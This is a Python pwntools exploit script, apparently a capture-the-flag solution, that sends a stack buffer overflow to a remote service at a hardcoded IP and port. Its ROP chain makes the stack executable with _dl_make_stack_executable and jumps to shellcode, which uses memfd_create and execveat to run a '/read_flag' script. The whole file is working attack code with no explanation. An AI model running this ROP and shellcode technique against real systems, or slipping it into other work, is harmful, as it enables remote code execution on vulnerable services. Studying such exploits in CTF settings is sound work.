#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
context.log_level = "critical"
context.binary = "./app/app"
elf = context.binary

#  io = elf.process()
io = remote("34.82.101.212", 10011)

payload = flat(
        '0' * 0x108,
        0x0000000000400686, # pop rdi; ret;
        elf.sym['__stack_prot'] - 8,
        0x0000000000415234, # pop rax; ret;
        7,
        0x0000000000416106, # mov qword ptr [rdi + 8], rax; ret;
        0x0000000000400686, # pop rdi; ret;
        elf.sym['__libc_stack_end'],
        elf.sym['_dl_make_stack_executable'],
        0x00000000004941fb, # jmp rsp;
        )

sc  = asm(shellcraft.pushstr("nailit"))
sc += asm(shellcraft.syscall(319, "rsp", 0)) # memfd_create("nailit", 0)
sc += asm('''mov r12, rax''')
sc += asm(shellcraft.pushstr("#!/read_flag"))
sc += asm(shellcraft.write("r12", "rsp", len("#!/read_flag")))
sc += asm('''
        push 0
        mov rsi, rsp
        xor rdx, rdx
        xor r10, r10
        mov r8, 0x1000
        mov rax, 322
        mov rdi, r12
        syscall
        ''')    # stub_execveat(4, [0], 0, 0, 0)
sc += asm(shellcraft.exit(0))

payload += (sc)

#  gdb.attach(io, "b *0x4941fb\nc")
write("payload", payload)
io.sendline(payload)

#  io.interactive()
print(io.recv())
io.close()
